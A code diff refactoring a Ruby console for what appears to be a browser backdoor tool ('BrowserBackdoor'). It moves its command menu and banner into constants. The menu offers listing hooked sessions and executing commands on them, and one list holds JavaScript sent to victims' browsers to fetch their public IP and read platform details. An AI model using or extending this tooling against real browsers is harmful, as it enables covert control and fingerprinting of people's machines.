@@ -55,33 +55,35 @@ def print_notice(message)
     puts "[*] " + message
 end
 
+COMMANDS = {
+    "help" => "Help menu",
+    "exit" => "Quit the application",
+    "sessions" => "List active sessions",
+    "use" => "Select active session",
+    "info" => "Get session information (IP, User Agent)",
+    "exec" => "Execute a command on a session",
+    "get_cert" => "Get a free TLS certificate from LetsEncrypt",
+    "load" => "Load a module (not implemented"
+}
+
+WELCOME_MESSAGE = ""\
+" ____                                  ____             _       _                  \n"\
+"|  _ \                                |  _ \           | |     | |                 \n"\
+"| |_) |_ __ _____      _____  ___ _ __| |_) | __ _  ___| | ____| | ___   ___  _ __ \n"\
+"|  _ <| '__/ _ \ \ /\ / / __|/ _ \ '__|  _ < / _' |/ __| |/ / _' |/ _ \ / _ \| '__|\n"\
+"| |_) | | | (_) \ V  V /\__ \  __/ |  | |_) | (_| | (__|   < (_| | (_) | (_) | |   \n"\
+"|____/|_|  \___/ \_/\_/ |___/\___|_|  |____/ \__,_|\___|_|\_\__,_|\___/ \___/|_| by IMcPwn\n"\
+"Visit http://imcpwn.com for more information.\n"
+
 def cmdLine()
-    welcome_message = ""\
-    " ____                                  ____             _       _                  \n"\
-    "|  _ \                                |  _ \           | |     | |                 \n"\
-    "| |_) |_ __ _____      _____  ___ _ __| |_) | __ _  ___| | ____| | ___   ___  _ __ \n"\
-    "|  _ <| '__/ _ \ \ /\ / / __|/ _ \ '__|  _ < / _' |/ __| |/ / _' |/ _ \ / _ \| '__|\n"\
-    "| |_) | | | (_) \ V  V /\__ \  __/ |  | |_) | (_| | (__|   < (_| | (_) | (_) | |   \n"\
-    "|____/|_|  \___/ \_/\_/ |___/\___|_|  |____/ \__,_|\___|_|\_\__,_|\___/ \___/|_| by IMcPwn\n"\
-    "Visit http://imcpwn.com for more information.\n"
-    commands = {
-        "help" => "Help menu",
-        "exit" => "Quit the application",
-        "sessions" => "List active sessions",
-        "use" => "Select active session",
-        "info" => "Get session information (IP, User Agent)",
-        "exec" => "Execute a command on a session",
-        "get_cert" => "Get a free TLS certificate from LetsEncrypt",
-        "load" => "Load a module (not implemented"
-    }
-    puts welcome_message
+    puts WELCOME_MESSAGE
     print "Enter help for help."
     while true
         print "\n> "
         cmdIn = gets.chomp.split()
         case cmdIn[0]
         when "help"
-            commands.each do |key, array|
+            COMMANDS.each do |key, array|
                 print key
                 print " --> "
                 puts array
@@ -115,8 +117,8 @@ def cmdLine()
                 next
             end
             # TODO: Improve method of getting IP address
-            commands = ["var xhttp = new XMLHttpRequest();xhttp.open(\"GET\", \"https://ipv4.icanhazip.com/\", false);xhttp.send();xhttp.responseText","navigator.appVersion;", "navigator.platform;", "navigator.language;"]
-            commands.each {|cmd|
+            infoCommands = ["var xhttp = new XMLHttpRequest();xhttp.open(\"GET\", \"https://ipv4.icanhazip.com/\", false);xhttp.send();xhttp.responseText","navigator.appVersion;", "navigator.platform;", "navigator.language;"]
+            infoCommands.each {|cmd|
                 begin
                     sendCommand(cmd, $wsList[$selected])
                 rescue
